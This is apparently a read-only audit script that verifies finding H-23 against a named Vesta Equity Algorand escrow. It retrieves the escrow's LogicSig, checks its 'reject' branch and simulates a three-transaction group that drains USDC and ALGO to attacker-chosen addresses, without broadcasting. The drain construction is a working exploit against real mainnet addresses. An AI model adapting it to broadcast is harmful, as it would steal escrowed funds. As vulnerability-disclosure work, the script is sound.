#!/usr/bin/env python3
"""Vesta Equity (Algorand) — read-only CI verification for finding H-23.

No transactions are signed or broadcast. Only public algod/indexer GETs plus
algod /v2/transactions/simulate (a dry-run endpoint that does not broadcast).

Verifies, from scratch:
  1. LGWHT7ED escrow account state (ALGO + USDC + frozen VST holding).
  2. Its LogicSig program is publicly retrievable; address == hash(program).
  3. The program's arg_0="reject" branch only asserts GroupSize==3 then returns 1.
  4. SIMULATE: a 3-tx group in which the escrow closes 75 USDC to an
     attacker-chosen address and pays its free ALGO to a fresh address is VALID
     (permissionless drain proven; no broadcast).
  5. Vesta's control account RQI and all 8 escrow accounts created ZERO apps.
  6. Escrow census: RQI's payment counterparties contain exactly 8 LogicSig
     escrow accounts; only LGWHT7ED holds value.

Writes ../ci-out/vesta_ci_verify.json (and echoes a summary).
"""
import base64
import hashlib
import json
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import requests
from algosdk import account, transaction
from algosdk.v2client import models
from algosdk.v2client.algod import AlgodClient

IDX = "https://mainnet-idx.algonode.cloud"
ALGOD = "https://mainnet-api.algonode.cloud"
ESCROW = "LGWHT7EDRGXQMRTLQDL54WKQU2FYRMNTGF6QXVDMZRCXHBUOLR3BSIJQBY"
RQI = "RQIQQIHYGFF4NR5ODLSYMK5EGETHCYZT2YDAILPW4MNEBF4OUTJTMWDSOI"
USDC = 31566704
ESCROWS = [
    "3JMMSUISULB5JGEKBG654UVBXTH5UEEFDZWO5XLJUCTHPYUS6CUEGIBHYU",
    "CWNSUHA2IC4I3SL67H5UI7OV2ZWMLGBKI32RX2RDQ75BXGUVFKVW32TONU",
    "FCGL5AJEC5WGM7VHBLL5WXGHSM3HCLHJD4WYSZW3H5KVYZT6EU2Z7PQSEY",
    "FJMNV6SXJWJXMPMUOLASTHFW3OCW5ZGWLZTISVVD7ZN3ICPH4XFQVTKIDQ",
    "IQXC57YUU2DEXYW6L2KA4HIKUPXXOP7AOPKJPG24RZQTEWRI3RHQUCYI2Q",
    ESCROW,
    "PJRCTS5SB7773PGKWF2IRYQX5WVO5CLSVQ236AZF72LDHQMA52ALDBCUFM",
    "VYC7JZCMQ5OW2XO3JZML4MWTZSV2MTSQ4K64TMRXVJDMRGVPTKHL6NQALY",
]

out = {"finding": "H-23", "title": "Vesta Equity (Algorand) read-only CI verification",
       "generated_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
       "algod": ALGOD, "indexer": IDX, "escrow": ESCROW, "no_broadcast": True}
client = AlgodClient("", ALGOD)


def get(url, allow404=False, **kw):
    for attempt in range(4):
        try:
            r = requests.get(url, timeout=40, **kw)
            if r.status_code == 200:
                return r.json()
            if r.status_code == 404 and allow404:
                return {}
        except Exception:
            pass
        time.sleep(1 + attempt)
    if allow404:
        return {}
    raise RuntimeError(f"GET failed: {url}")


# ---------- 1. escrow state ----------
st = get(f"{IDX}/v2/accounts/{ESCROW}")["account"]
usdc_bal = next((a["amount"] for a in st.get("assets", []) if a["asset-id"] == USDC), 0)
vst_hold = [(a["asset-id"], a["amount"], a.get("is-frozen")) for a in st.get("assets", []) if a["asset-id"] != USDC]
out["escrow_state"] = {"algo_microalgos": st.get("amount"), "usdc_base_units": usdc_bal,
                       "other_assets": vst_hold, "auth_addr": st.get("auth-addr"),
                       "round": get(f"{IDX}/health")["round"]}

# ---------- 2. program retrieval + address check ----------
txs = get(f"{IDX}/v2/accounts/{ESCROW}/transactions", params={"sig-type": "lsig", "limit": 1})["transactions"]
prog_b64 = txs[0]["signature"]["logicsig"]["logic"]
raw = base64.b64decode(prog_b64)
ar = hashlib.new("sha512_256", b"Program" + raw).digest()
chk = hashlib.new("sha512_256", ar).digest()[-4:]
addr = base64.b32encode(ar + chk).decode().rstrip("=")
out["program"] = {"sha256": hashlib.sha256(raw).hexdigest(), "bytes": len(raw),
                  "computed_address": addr, "address_matches": addr == ESCROW,
                  "lsig_args_sample": [base64.b64decode(a).decode("utf-8", "replace")
                                       for a in txs[0]["signature"]["logicsig"].get("args", [])]}

# ---------- 3. disassemble + reject branch ----------
dis = requests.post(f"{ALGOD}/v2/teal/disassemble", data=raw, timeout=60).json()["result"]
lines = dis.splitlines()
rej_idx = next((i for i, l in enumerate(lines) if '"reject"' in l), None)
rej_block = lines[rej_idx + 1: rej_idx + 10] if rej_idx is not None else []
out["reject_branch"] = {"lines": rej_block,
                        "is_unconditional_3tx_approval": any("GroupSize" in l for l in rej_block)
                        and any("==" in l for l in rej_block) and any(l.strip().startswith("intc") for l in rej_block)}

# ---------- 4. simulate the drain (dry run, no broadcast) ----------
sp = client.suggested_params()
lsig = transaction.LogicSigAccount(raw, ["reject"])
opt_in_recv = "FZHGJCVRUWSJ57CGKEGNZZ2GMP3VERDBNOQYVHHC3XYQ7WITCD2LGAKF4E"  # already USDC-opted
sk, fresh = account.generate_account()
tx0 = transaction.AssetTransferTxn(sender=ESCROW, sp=sp, receiver=opt_in_recv, amt=0,
                                   index=USDC, close_assets_to=opt_in_recv)
free_algo = max(0, (st.get("amount") or 0) - 200000 - 2000)  # min 0.2 ALGO after USDC close-out + fees
tx1 = transaction.PaymentTxn(sender=ESCROW, sp=sp, receiver=fresh, amt=free_algo)
filler = "I36BMZVLIUKQCKWNFHYQP2YODUMQRAWKHHSBN2NH57T2OIYAIQJAQJ5AHE"
tx2 = transaction.PaymentTxn(sender=filler, sp=sp, receiver=filler, amt=0)
for t in (tx0, tx1, tx2):
    t.fee = 1000
transaction.assign_group_id([tx0, tx1, tx2])
req = models.SimulateRequest(
    txn_groups=[models.SimulateRequestTransactionGroup(
        txns=[transaction.LogicSigTransaction(tx0, lsig),
              transaction.LogicSigTransaction(tx1, lsig),
              transaction.SignedTransaction(tx2, None)])],
    allow_empty_signatures=True)
res = client.simulate_transactions(req)
g = res["txn-groups"][0]
out["simulate"] = {
    "failed_at": g.get("failed-at"), "failure_message": g.get("failure-message"),
    "drained_usdc_base_units": g["txn-results"][0].get("txn-result", {}).get("asset-closing-amount"),
    "drained_algo_microalgos": free_algo,
    "fresh_recipient": fresh, "arg": "reject", "group_size": 3,
    "success": not g.get("failed-at"),
}

# ---------- 5. no apps created by Vesta actors ----------
out["created_apps"] = {}
for a in [RQI] + ESCROWS:
    acc = get(f"{IDX}/v2/accounts/{a}", allow404=True).get("account", {})
    out["created_apps"][a] = [x["id"] for x in acc.get("created-apps", [])]

# ---------- 6. escrow census from RQI payment counterparties ----------
all_tx, nextt, pages = [], None, 0
while pages < 10:
    p = {"limit": 100}
    if nextt:
        p["next"] = nextt
    d = get(f"{IDX}/v2/accounts/{RQI}/transactions", params=p)
    all_tx.extend(d.get("transactions", []))
    nextt = d.get("next-token")
    pages += 1
    if not nextt:
        break
receivers = sorted({t["payment-transaction"]["receiver"] for t in all_tx
                    if t["tx-type"] == "pay" and t.get("payment-transaction", {}).get("receiver")
                    and t["payment-transaction"]["receiver"] != RQI})


def lsig_check(a):
    try:
        d = get(f"{IDX}/v2/accounts/{a}/transactions", params={"sig-type": "lsig", "limit": 1})
        return a, bool(d.get("transactions"))
    except Exception:
        return a, None


with ThreadPoolExecutor(max_workers=8) as ex:
    lsig_accounts = [a for a, ok in ex.map(lsig_check, receivers) if ok]
out["census"] = {"rqi_txs": len(all_tx), "rqi_payment_counterparties": len(receivers),
                 "lsig_accounts": sorted(lsig_accounts),
                 "lsig_count": len(lsig_accounts),
                 "escrows_match_expected": sorted(lsig_accounts) == sorted(ESCROWS)}
nonempty = {}
for a in ESCROWS:
    acc = get(f"{IDX}/v2/accounts/{a}", allow404=True).get("account", {})
    if (acc.get("amount") or 0) > 0 or acc.get("assets"):
        nonempty[a] = {"algo": acc.get("amount"), "assets": acc.get("assets")}
out["nonempty_escrows"] = nonempty

os.makedirs(os.path.join(os.path.dirname(__file__), "..", "ci-out"), exist_ok=True)
dest = os.path.join(os.path.dirname(__file__), "..", "ci-out", "vesta_ci_verify.json")
with open(dest, "w") as f:
    json.dump(out, f, indent=1, default=str)
print(json.dumps({k: out[k] for k in ("escrow_state", "program", "reject_branch", "simulate", "census")}, indent=1, default=str))
print("wrote", dest)
sys.exit(0 if out["simulate"]["success"] and out["census"]["escrows_match_expected"] else 1)
